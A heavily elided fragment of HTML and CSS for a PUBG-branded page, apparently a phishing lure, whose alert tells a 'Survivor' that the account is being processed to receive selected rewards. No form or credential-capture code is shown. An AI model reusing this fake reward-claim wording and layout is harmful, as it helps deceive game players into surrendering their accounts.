   ...
   @font-face {
     ...
     src: url('css/pubg.ttf') format("truetype");
       ...
       .wrap .bg {
           ...
           width:100%;
           height:100%;
           background:url('https://i.ibb.co/z6xTrvm/images-2020-10-04-T195117-266.jpg') no-repeat;
...
<center>
    ...
    <div class="mask"></div>
        <div class="alert">
            ...
            <p>Hi Survivor, your account has been processing to receive your selected rewards
			<br>
			<br>
